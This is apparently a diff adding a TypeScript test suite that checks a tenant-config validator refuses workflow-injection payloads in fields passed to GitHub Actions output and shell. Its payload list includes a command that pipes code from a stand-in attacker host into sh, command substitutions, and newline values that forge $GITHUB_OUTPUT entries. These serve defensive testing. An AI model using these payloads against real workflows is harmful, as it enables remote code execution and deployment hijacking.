@@ -106,6 +106,78 @@ describe("validateTenantValues", () => {
   });
 });
 
+// Attack matrix — workflow injection. Every field here is dispatched to a
+// workflow, which writes it onto a line of $GITHUB_OUTPUT and from there into
+// shell commands and Terraform variables. Each payload is appended to a value
+// that is otherwise valid, so a refusal can only be the payload's doing.
+describe("workflow injection through a dispatched field", () => {
+  const awsWithCert: TenantValues = {
+    ...awsValues,
+    domain: "chat.acme.com",
+    acmCertificateArn: "arn:aws:acm:us-east-1:123456789012:certificate/0f1e2d3c-4b5a-6978-8a9b-0c1d2e3f4a5b",
+    s3DocsPrefix: "handbook/",
+    llmModel: "gpt-4o-mini",
+  };
+  const azureWithModel: TenantValues = { ...azureValues, llmModel: "gpt-4o-mini" };
+
+  const fields: [string, string, TenantValues][] = [
+    ["slug", "aws", awsWithCert],
+    ["awsAccountId", "aws", awsWithCert],
+    ["awsRegion", "aws", awsWithCert],
+    ["deploymentRoleArn", "aws", awsWithCert],
+    ["chatbotVersion", "aws", awsWithCert],
+    ["domain", "aws", awsWithCert],
+    ["acmCertificateArn", "aws", awsWithCert],
+    ["s3DocsPrefix", "aws", awsWithCert],
+    ["llmModel", "aws", awsWithCert],
+    ["slug", "azure", azureWithModel],
+    ["azureRegion", "azure", azureWithModel],
+    ["azureSubscriptionId", "azure", azureWithModel],
+    ["azureClientId", "azure", azureWithModel],
+    ["chatbotVersion", "azure", azureWithModel],
+    ["llmModel", "azure", azureWithModel],
+  ];
+
+  const payloads: [string, string][] = [
+    ["a command separator", "; curl https://attacker.example/x | sh"],
+    ["command substitution", "$(id)"],
+    ["backtick substitution", "`id`"],
+    ["a pipe", "|id"],
+    // The one that needs no shell at all: a second line in $GITHUB_OUTPUT.
+    ["a new output line", "\nazure_subscription_id=00000000-0000-0000-0000-000000000000"],
+    ["a carriage return", "\razure_client_id=attacker"],
+    ["a NUL byte", "\u0000"],
+    ["an oversized value", "a".repeat(5000)],
+  ];
+
+  it("accepts every baseline value, so each refusal below is the payload's", () => {
+    expect(validateTenantValues(awsWithCert)).toEqual({});
+    expect(validateTenantValues(azureWithModel)).toEqual({});
+  });
+
+  describe.each(fields)("%s on %s", (field, _cloud, base) => {
+    it.each(payloads)("refuses %s", (_label, payload) => {
+      const errors = validateTenantValues({ ...base, [field]: `${base[field]}${payload}` });
+      expect(errors[field]).toBeDefined();
+    });
+  });
+
+  // Controls: what real tenants use must still pass.
+  it.each([
+    ["chatbotVersion", "v1.4.2"],
+    ["chatbotVersion", "sha-61de490"],
+    ["llmModel", "meta-llama/llama-3.3-70b-instruct:free"],
+    ["llmModel", "claude-3-5-haiku-20241022"],
+    ["llmModel", "anthropic/claude-3.5-sonnet"],
+  ])("still accepts %s = %s", (field, value) => {
+    expect(validateTenantValues({ ...awsValues, [field]: value })).toEqual({});
+  });
+
+  it.each(["swedencentral", "eastus2", "westeurope"])("still accepts the Azure region %s", (azureRegion) => {
+    expect(validateTenantValues({ ...azureValues, azureRegion })).toEqual({});
+  });
+});
+
 describe("rawTenantInput", () => {
   it("treats a blank optional field as absent rather than empty", () => {
     const raw = rawTenantInput({ ...awsValues, domain: "", llmModel: "", acmCertificateArn: "" });
